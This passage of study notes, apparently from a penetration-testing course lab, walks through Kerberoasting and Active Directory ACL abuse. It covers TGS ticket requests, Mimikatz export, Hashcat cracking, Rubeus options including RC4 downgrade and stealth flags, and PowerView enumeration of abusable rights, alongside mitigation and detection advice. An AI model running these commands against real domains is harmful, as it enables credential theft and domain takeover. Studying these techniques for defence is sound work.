New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**Command Breakdown:**
- `Add-Type -AssemblyName System.IdentityModel` — Loads the `System.IdentityModel` .NET assembly into the PowerShell session. This namespace contains classes for building security tokens including Kerberos.
- `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken` — Creates a new Kerberos security token — this action automatically sends a TGS request to the KDC and loads the ticket into the current session's Kerberos cache (in LSASS memory)
- `-ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` — The SPN to request a ticket for

This is essentially what Rubeus does internally with its default Kerberoasting method.

**Retrieving all tickets for all SPNs at once:**

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**Command Breakdown:**
- `setspn.exe -T INLANEFREIGHT.LOCAL -Q */*` — Queries all SPNs in the domain
- `| Select-String '^CN' -Context 0,1` — Finds lines starting with `CN` (account Distinguished Name) and includes 1 line of context after (the SPN line)
- `| % { New-Object ... -ArgumentList $_.Context.PostContext[0].Trim() }` — For each SPN found, requests a TGS ticket. `$_.Context.PostContext[0].Trim()` extracts the SPN value and trims whitespace.

Note: this also pulls computer account tickets — those can be ignored since they can't be cracked.

---

### Extracting Tickets with Mimikatz

Once TGS tickets are loaded in memory (from the requests above), we use **Mimikatz** to extract them.

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

**Command Breakdown:**
- `base64 /out:true` — Tells Mimikatz to output ticket data as a **base64 blob** instead of writing `.kirbi` files directly to disk. Useful for copy-pasting the ticket out over a terminal without needing file transfer.
- `kerberos::list /export` — Lists all Kerberos tickets in the current logon session and exports them — either as base64 (if the above flag is set) or as `.kirbi` files on disk.

The output will show the ticket details (Server Name, Client Name, Flags, encryption type `0x00000017` = RC4) followed by a large base64 blob. Copy that blob for the next step.

> **Note:** If you skip `base64 /out:true`, Mimikatz writes `.kirbi` files directly to disk. You can then run `kirbi2john.py` against them directly, skipping the base64 decode step entirely.

---

#### Preparing the Base64 Blob for Cracking

The base64 output from Mimikatz is column-wrapped (split across multiple lines). Before we can decode it, we need it all on one single line:

```bash
echo "<base64 blob>" | tr -d \\n
```

**Command Breakdown:**
- `echo "<base64 blob>"` — Prints the base64 blob copied from Mimikatz output
- `| tr -d \\n` — Pipes it to `tr` which **deletes** (`-d`) all newline characters (`\\n`), collapsing everything into a single continuous string

This gives us one clean line of base64 that can be decoded.

---

#### Placing the Output into a File as .kirbi

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

**Command Breakdown:**
- `cat encoded_file` — Reads the file containing the single-line base64 string
- `| base64 -d` — Decodes the base64 back to binary — this is the raw Kerberos ticket in `.kirbi` format (the native Kerberos credential cache format used by Windows)
- `> sqldev.kirbi` — Writes the decoded binary to a `.kirbi` file

---

#### Extracting the Kerberos Ticket using kirbi2john.py

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

**Command Breakdown:**
- `kirbi2john.py` — A Python 2 script that reads a `.kirbi` Kerberos ticket file and converts it into a format that John the Ripper (and Hashcat) can crack
- `sqldev.kirbi` — The decoded ticket file from the previous step

This creates a file called `crack_file` containing the extracted hash.

---

#### Modifying crack_file for Hashcat

The output from `kirbi2john.py` needs a small format adjustment before Hashcat can process it:

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

**Command Breakdown:**
- `sed 's/pattern/replacement/'` — Stream editor performing a regex substitution on each line
- The regex reformats the hash from John format (`$krb5tgs$...:...`) to Hashcat mode 13100 format (`$krb5tgs$23$*...*$...`)
- `crack_file` — Input file from kirbi2john.py
- `> sqldev_tgs_hashcat` — Writes the reformatted hash to a new file ready for Hashcat

You can verify the output looks correct with:

```bash
cat sqldev_tgs_hashcat
```

The hash should start with `$krb5tgs$23$*sqldev.kirbi*$...`

---

#### Cracking the Hash with Hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

**Command Breakdown:**
- `-m 13100` — Hashcat mode for **Kerberos 5, etype 23, TGS-REP** (RC4-HMAC)
- `sqldev_tgs_hashcat` — The reformatted hash file
- `/usr/share/wordlists/rockyou.txt` — The wordlist

Result: `database!` — same password, confirming the manual method produces the same crackable hash as the automated approach.

---

### Automated Kerberoasting with PowerView

Most assessments are time-boxed — we need to work quickly and efficiently. The manual Mimikatz method works, but automated tools get us there faster. Here are two quick approaches: **PowerView** and **Rubeus**.

**Enumerating SPN accounts with PowerView:**

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

**Example output:**

```
samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

**Requesting TGS ticket for a specific user in Hashcat format:**

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Command Breakdown:**
- `Get-DomainUser -Identity sqldev` — Retrieves the AD user object for `sqldev`
- `| Get-DomainSPNTicket -Format Hashcat` — Requests the TGS ticket and outputs it directly in Hashcat-ready format

**Example output:**

```
SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609...
```

The hash is already in Hashcat mode 13100 format — just copy the value after `Hash :` and feed it to Hashcat.

**Exporting all TGS tickets to CSV:**

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

**Command Breakdown:**
- `Get-DomainUser * -SPN` — Gets all domain users with SPNs set
- `| Get-DomainSPNTicket -Format Hashcat` — Requests TGS tickets for all of them in Hashcat format
- `| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` — Exports all results to a CSV. `-NoTypeInformation` removes the `#TYPE` header line.

**Viewing the CSV contents:**

```powershell
cat .\ilfreight_tgs.csv
```

**Example output:**

```
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,...","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE..."
```

The CSV can be parsed to extract just the `Hash` column for feeding to Hashcat in bulk.

---

### Kerberoasting with Rubeus

**Rubeus** is a C# toolset for Kerberos interaction and abuses, from GhostPack. It's the most capable tool for Kerberoasting from Windows — it handles SPN enumeration, ticket requesting, and output formatting all in one command. Running `.\Rubeus.exe` without flags shows the full menu of capabilities:

**Key Rubeus Kerberoasting options:**
- `kerberoast /spn:"blah/blah"` — Kerberoast a specific SPN
- `kerberoast /outfile:hashes.txt` — Output hashes to a file
- `kerberoast /simple` — Output hashes to console in file format
- `kerberoast /creduser:DOMAIN\USER /credpassword:PASS` — Use alternate credentials
- `kerberoast /ticket:BASE64` — Use an existing TGT
- `kerberoast /usetgtdeleg` — Use TGT delegation to request RC4 tickets (downgrade)
- `kerberoast /rc4opsec` — "Opsec" mode — uses tgtdeleg and filters out AES-only accounts
- `kerberoast /stats` — List stats without sending ticket requests
- `kerberoast /ldapfilter:'admincount=1'` — Target only protected group members
- `kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5` — Target accounts by password age with a result limit
- `kerberoast /delay:5000 /jitter:30` — Add delay and jitter between requests (stealth)
- `kerberoast /aes` — Request AES tickets only

**Viewing statistics about Kerberoastable accounts:**

```powershell
.\Rubeus.exe kerberoast /stats
```

**Command Breakdown:**
- `/stats` — Lists statistics about found Kerberoastable accounts **without actually sending ticket requests**. Shows counts by encryption type and password last set year — use this first before making noise.

**Full example output:**

```
[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for
    '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)
    (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9

 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

From this: 9 Kerberoastable accounts, 7 RC4 (fast to crack), 2 AES-only (slower). All passwords set in 2022. Accounts with passwords set 5+ years ago are higher-value targets — may have been weak passwords set when the org was less security-mature.

**Kerberoasting high-value accounts only (admincount=1):**

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

**Command Breakdown:**
- `/ldapfilter:'admincount=1'` — Targets only accounts with `admincount=1` — members of protected groups like Domain Admins. Highest-value targets first.
- `/nowrap` — Prevents line-wrapping on base64 blobs — paste directly into Hashcat without editing

**Full example output:**

```
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Total kerberoastable users : 3

[*] SamAccountName         : backupagent
[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
[*] PwdLastSet             : 2/15/2022 2:15:40 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$...
```

3 high-value accounts — all protected group members. `backupagent` uses RC4 — crack this first.

**Kerberoasting a specific user:**

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

**Example output (RC4 account):**

```
[*] SamAccountName         : testspn
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$...
```

**Verifying encryption type with PowerView:**

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

**Output (RC4 default — value 0):**

```
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                             0 testspn
```

`0` = no specific type defined → defaults to RC4_HMAC_MD5.

**Cracking the RC4 ticket:**

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

**Full cracking output:**

```
Status.......: Cracked
Hash.Name....: Kerberos 5, etype 23, TGS-REP
Time.Started.: Sun Feb 27 15:36:58 2022 (4 secs)
Speed.#1.....:   693.3 kH/s
Recovered....: 1/1 (100.00%) Digests

$krb5tgs$23$*testspn$...:welcome1$
```

Password `welcome1$` cracked in **4 seconds** on a CPU.

---

#### A Note on Encryption Types

> **Note:** The AES examples below are not reproducible in the module lab — the DC runs Windows Server 2019. Details at the end of this section.

When an account is configured for AES only (`msds-supportedencryptiontypes = 24`):

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

**Output (AES account — value 24):**

```
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn
```

`24` = AES128 + AES256 only.

**Requesting ticket for an AES account gives type 18 hash:**

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

```
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local*$8939F8C5B97A4CAA170AD706$...
```

**Cracking AES-256 with Hashcat:**

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

**Status while running (22+ minutes estimated):**

```
Status.......: Running
Hash.Name....: Kerberos 5, etype 18, TGS-REP
Time.Estimated: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs remaining)
Speed.#1.....:    10277 H/s
```

**Final result:**

```
Status.......: Cracked
Time.Started.: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Recovered....: 1/1 (100.00%) Digests
```

Same password: **4 seconds for RC4** vs **4 mins 36 secs for AES-256** on the same CPU. On a real GPU rig the times drop but the ratio remains — RC4 always cracks far faster.

**Encryption type values summary:**

| Value | Meaning |
|---|---|
| `0` | Not defined → defaults to RC4 |
| `17` | AES128 only |
| `18` | AES256 only |
| `24` | AES128 + AES256 |
| `31` | All types including DES and RC4 |

**Downgrading AES accounts to RC4 with `/tgtdeleg`:**

```powershell
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

Even for AES-configured accounts, this requests an RC4 ticket by using TGT delegation — Rubeus gets a TGT via credential delegation then uses it to request a service ticket specifying only RC4. The output will show `RC4_HMAC_DEFAULT` even though the account supports AES — cutting cracking time from minutes to seconds.

> **Important:** `/tgtdeleg` does **NOT** work against **Windows Server 2019** DCs. AES-enabled accounts on Server 2019 will always return AES. On **Server 2016 and earlier** the downgrade works. This is a critical distinction — check your DC version before relying on this.

**Group Policy note:** Kerberos encryption types can be restricted via `Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Network security: Configure encryption types allowed for Kerberos`. Removing AES entirely would be a security flaw and should never be done. Removing RC4 forces AES tickets everywhere but must be tested thoroughly before implementation as it can break legacy services.

---

### Mitigation & Detection for Kerberoasting

**Mitigation:**
- Use **Group Managed Service Accounts (gMSA)** for service accounts — they use auto-rotating complex passwords that are essentially impossible to crack offline. This is the best fix.
- If standard accounts must be used as SPNs, enforce long passphrases that don't appear in any wordlist
- Remove SPNs from accounts that don't genuinely require them
- Don't add service accounts to privileged groups like Domain Admins unless absolutely necessary

**Detection:**
- Enable **Kerberos Service Ticket auditing** in Group Policy: `Audit Kerberos Service Ticket Operations` — this generates:
  - **Event ID 4769** — A Kerberos service ticket (TGS) was requested
  - **Event ID 4770** — A Kerberos service ticket was renewed
- Monitor for a **large number of Event ID 4769 events in a short period from a single source** — this is the primary Kerberoasting indicator. Normal environments generate some 4769 events, but a burst of them from one IP targeting many different service accounts is suspicious.
- Pay special attention to 4769 events where the **Ticket Encryption Type is `0x17`** (hex for decimal 23 = RC4-HMAC) — most modern environments should be using AES, so RC4 TGS requests are a strong indicator of Kerberoasting activity. Defenders can tune their SIEM to alert specifically on this condition.

---

### Continuing Onwards

Once we have a set of cracked credentials from Kerberoasting, we have multiple paths forward depending on the privilege level of the account we compromised:

- **Access a host via RDP or WinRM** — as a local user or local admin, giving us an interactive session on the target
- **Authenticate to a remote host as admin using PsExec** — if the account has local admin rights we can get a shell
- **Gain access to sensitive file shares** — the account may have READ/WRITE access to shares containing credentials, configs, or other sensitive data
- **Gain MSSQL access as a DBA user** — if the cracked account was an SQL service account, we may be able to connect to the database, enable `xp_cmdshell`, and gain code execution on the SQL server
- **Continue domain enumeration** — even a low-privilege domain account opens up all the AD enumeration techniques covered earlier in this module

Regardless of what access the cracked account provides, we should continue digging deeper into the domain for other flaws and misconfigurations — Kerberoasting is one path to access, but rarely the only one. Every new set of credentials opens new doors.

---

# Active Directory Security Notes
## Comprehensive Study Guide: ACL Abuse, Attacks, Trusts & Misconfigurations

---

# 17. Access Control List (ACL) Abuse Primer

## 17.1 Access Control List (ACL) Overview

Access Control Lists (ACLs) are fundamental security mechanisms in Active Directory that define who has access to which asset or resource and the level of access provisioned. In their simplest form, ACLs act as gatekeepers for every object within an AD environment. The individual settings within an ACL are called Access Control Entries (ACEs), and each ACE maps back to a specific user, group, or process — collectively known as security principals. Every object in AD has an ACL, and a single object can have multiple ACEs because multiple security principals may be granted different levels of access. ACLs are also used for auditing access, helping administrators track who accessed what and when.

There are two types of ACLs:

- **Discretionary Access Control List (DACL):** Defines which security principals are granted or denied access to an object. DACLs are composed of ACEs that either allow or deny access. If no DACL exists on an object, all users are granted full rights. If a DACL exists but has no ACE entries, access is denied to everyone.
- **System Access Control Lists (SACL):** Allow administrators to log access attempts to secured objects. SACLs are viewed under the **Auditing** tab in Active Directory Users and Computers.

---

## 17.2 Access Control Entries (ACEs)

ACEs are the individual rules inside an ACL that define what a principal can or cannot do on an object. There are three main types of ACEs applicable to all securable objects in AD:

| ACE Type | Description |
|---|---|
| Access Denied ACE | Used within a DACL to explicitly deny access to an object for a user or group |
| Access Allowed ACE | Used within a DACL to explicitly grant access to an object for a user or group |
| System Audit ACE | Used within a SACL to generate audit logs when access is attempted; records whether access was granted or denied |

Each ACE is made up of four components:
1. The **Security Identifier (SID)** of the user/group that has access (or the principal name graphically)
2. A **flag** denoting the type of ACE (access denied, allowed, or system audit)
3. A **set of flags** specifying whether child containers/objects can inherit the given ACE from the parent
4. An **access mask** — a 32-bit value defining the rights granted to an object

> **Note:** When ACLs are checked for permissions, they are evaluated **top to bottom** until an "access denied" entry is found.

---

## 17.3 Why Are ACEs Important?

Attackers exploit misconfigured ACE entries to further access or establish persistence within an AD environment. These misconfigurations are particularly dangerous because they cannot be detected by standard vulnerability scanning tools and often go unchecked for years, especially in large organizations. During penetration tests where obvious vulnerabilities have been patched, ACL abuse can be an excellent technique for lateral movement, vertical privilege escalation, and even full domain compromise. Key abusable ACE permissions and the PowerView functions used to exploit them include:

| Permission | Abuse Method |
|---|---|
| ForceChangePassword | `Set-DomainUserPassword` |
| Add Members | `Add-DomainGroupMember` |
| GenericAll | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| GenericWrite | `Set-DomainObject` |
| WriteOwner | `Set-DomainObjectOwner` |
| WriteDACL | `Add-DomainObjectACL` |
| AllExtendedRights | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| AddSelf | `Add-DomainGroupMember` |

### Key ACEs Focused on in This Module:

- **ForceChangePassword:** Grants the right to reset a user's password **without knowing the current password**. This means an attacker who holds this right over a user account can change that user's password to anything they choose without needing to know what the existing password is — effectively hijacking the account. Should be used cautiously — always consult the client before resetting passwords in a production environment.
- **GenericWrite:** Allows writing to any non-protected attribute on an object. Over a user, it enables assigning an SPN and performing Kerberoasting. Over a group, it allows adding members. Over a computer, it enables Resource-Based Constrained Delegation attacks.
- **AddSelf:** Shows which security groups a user can add themselves to directly.
- **GenericAll:** Grants full control over a target object — this includes modifying group membership, forcing a password change, or targeted Kerberoasting. On a computer object, it allows reading the LAPS password if LAPS is deployed.

### Other Interesting Extended Rights Encountered in the Wild

Beyond the four main ACEs covered in this module, you will encounter other extended rights during real assessments. Key examples include:

- **ReadGMSAPassword:** Grants the right to read the password of a **Group Managed Service Account (gMSA)**. gMSAs are accounts whose passwords are automatically managed by AD and rotated periodically. If a user or group has this right (visible in BloodHound as the `ReadGMSAPassword` edge), they can retrieve the current password for that service account using tools such as **GMSAPasswordReader** or via `Get-ADServiceAccount` with the `-Properties PrincipalsAllowedToRetrieveManagedPassword` flag. This could give an attacker access to services running under that account.

- **Unexpire-Password:** An extended right that allows a principal to reset an expired password on a user account without knowing the current one. Unlike ForceChangePassword, this specifically targets accounts whose passwords have expired. It can be enumerated using PowerView and abused to re-enable access to accounts that were locked out due to password expiry.

- **Reanimate-Tombstones:** An extended right that allows a principal to restore deleted (tombstoned) objects in Active Directory. This can be abused to bring back a previously deleted high-privilege account and then take it over, potentially regaining access that was thought to be removed. Requires careful research when encountered, as it is uncommon.

> **Key takeaway:** Whenever you encounter an unfamiliar BloodHound edge or extended right via PowerView, research it thoroughly. The methodology for enumeration remains the same — identify who holds the right, what object it applies to, and what tools can be used to exploit it.

### ACE Attack Flowchart — WriteDACL, GenericWrite, GenericAll, WriteOwner

The flowchart below (from the module) shows the full breakdown of attack paths available from common ACE permissions, along with the Linux and Windows tools used for each:

| Starting Permission | Path | Attack | Linux Tool | Windows Tool |
|---|---|---|---|---|
| **WriteDACL** | → Grant Rights | → GenericAll / AllExtendedRights | — | — |
| **GenericWrite** | → WriteProperty | → Kerberos RBCD | `rbcd.py / ntlmrelayx.py` | `Set-DomainObject` |
| **GenericWrite** | → WriteProperty | → SPN-Jacking | Impacket Scripts | `PowerView & Rubeus` |
| **GenericWrite** | → WriteProperty | → Shadow Credentials | `pyWhisker.py` | Whisker |
| **GenericWrite** | → WriteProperty | → Logon Script | n/a | `Set-DomainObject` |
| **GenericWrite** | → Self | → Targeted Kerberoasting | `targetKerberoast.py` | `Set-DomainObject` |
| **GenericWrite** | → Self | → Evil GPOs | `pyGPOabuse.py` | `New-GPOImmediateTask` |
| **GenericAll / AllExtendedRights** | → | → AddMember | `pth-net rpc group addmem / ntlmrelayx.py` | `Add-DomainGroupMember / net group` |
| **GenericAll / AllExtendedRights** | → | → ForceChangePassword | `pth-net rpc password` | `Set-DomainUserPassword` |
| **GenericAll / AllExtendedRights** | → | → ReadLAPSPassword | `LAPSDumper.py / CrackMapExec` | `Get-ADComputer` |
| **GenericAll / AllExtendedRights** | → | → ReadGMSAPassword | `gMSADumper.py / ntlmrelayx.py` | `Get-ADServiceAccount` |
| **GenericAll / AllExtendedRights** | → | → DCSync | `secretsdump.py` | `mimikatz` |
| **WriteOwner** | → ANY | → Grant Ownership | n/a | `Set-DomainObjectOwner` |

---

## 17.4 ACL Attacks in the Wild

ACL attacks are used for **lateral movement**, **privilege escalation**, and **persistence**. Common real-world attack scenarios include:

| Attack Scenario | Description |
|---|---|
| Abusing forgot password permissions | Help Desk accounts with password reset rights can be leveraged to reset privileged account passwords |
| Abusing group membership management | Accounts with add/remove user rights over privileged groups can be used to grant elevated access |
| Excessive user rights | Accounts with unintended rights (e.g., from Exchange installation or legacy config) can be abused |

> **Important Note:** Some ACL attacks are destructive (e.g., changing a user's password). Always obtain written client approval before performing such actions during an assessment, and document every modification thoroughly.

---

# 18. ACL Enumeration

## 18.1 Enumerating ACLs with PowerView

PowerView is the primary tool for ACL enumeration in AD. While a broad scan (`Find-InterestingDomainAcl`) returns massive amounts of data, targeted enumeration is more efficient. The recommended approach starts with a known compromised user account and traces the ACL chain forward step by step.

### Using Find-InterestingDomainAcl (Broad Scan — Not Recommended for Time-Boxed Assessments)

```powershell
PS C:\htb> Find-InterestingDomainAcl

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

<SNIP>
```

**Explanation:**
- `Find-InterestingDomainAcl` scans all domain objects for ACL entries that may be exploitable and returns them all at once.
- The output is extremely verbose — in a large environment, this returns thousands of entries that would be nearly impossible to manually review during a time-boxed assessment.
- The `ObjectAceType` values are raw GUIDs (e.g., `ab721a53-1e2f-11d0-9819-00aa0040529b`), making it hard to quickly determine what rights are involved without further resolution.
- The preferred approach is **targeted enumeration** starting from a known compromised user, as shown in the steps below.

---

### Step 1 — Import PowerView and Get Target SID

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

**Explanation:**
- `Import-Module .\PowerView.ps1` — Loads the PowerView module into the current PowerShell session so all its functions are available.
- `Convert-NameToSid wley` — Converts the username `wley` into its Security Identifier (SID) value, which is needed for ACL lookups.

---

### Step 2 — Search for ACL Entries Belonging to the User (Using Get-DomainObjectACL)

> **Note:** This command can take 1–2 minutes to complete in a lab environment, and significantly longer in large production environments. Be patient.

```powershell
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

**Explanation:**
- `Get-DomainObjectACL -Identity *` — Retrieves ACL information for all domain objects.
- `? {$_.SecurityIdentifier -eq $sid}` — Filters results to only show entries where the SecurityIdentifier matches our target user's SID (`wley`'s SID stored in `$sid`).
- The output shows `wley` has an `ExtendedRight` (`AccessAllowed`) over the user `Dana Amundsen` (`damundsen`).
- **Critical limitation:** Without the `-ResolveGUIDs` flag, the `ObjectAceType` field returns a raw GUID (`00299570-246d-11d0-a768-00aa006e0529`) instead of a human-readable name. This GUID corresponds to `User-Force-Change-Password`, but you cannot tell that from the output alone — the next steps resolve this.

---

### Step 3 — Resolve GUIDs to Human-Readable Names (Manual Method — Performing a Reverse Search & Mapping to a GUID Value)

> **Note:** If PowerView has already been imported in the current session, this cmdlet may result in an error. Run it from a **new PowerShell session** if needed.

```powershell
PS C:\htb> $guid = "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

**Explanation:**
- We manually store the raw GUID from Step 2's output into the variable `$guid`.
- `Get-ADObject` queries the AD Extended-Rights container in the Configuration partition, which stores all defined extended rights in the forest.
- `-Filter {ObjectClass -like 'ControlAccessRight'}` limits results to control access right objects only.
- `?{$_.rightsGuid -eq $guid}` matches the stored GUID to a named right.
- The output confirms: GUID `00299570-246d-11d0-a768-00aa006e0529` = **User-Force-Change-Password** (display name: "Reset Password") — meaning `wley` can reset `damundsen`'s password without knowing the current one.
- While this works, it is highly inefficient during an assessment. The `-ResolveGUIDs` flag in Step 4 does this automatically.

---

### Step 4 — Use the -ResolveGUIDs Flag for Efficiency

```powershell
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

**Explanation:**
- `-ResolveGUIDs` automatically converts GUID values into human-readable names in the output, eliminating the need for the manual reverse lookup in Step 3.
- Now the `ObjectAceType` field shows `User-Force-Change-Password` in plain English instead of the raw GUID, making it immediately clear that `wley` can force-change `damundsen`'s password **without knowing the current password**.
- We walked through the manual GUID lookup first (Step 3) because it is essential to understand what your tools are doing — if PowerView is blocked or fails, you need an alternative method using only built-in cmdlets.
- The `ObjectDN` confirms the target: `Dana Amundsen (damundsen)` in the DevOps OU.

---
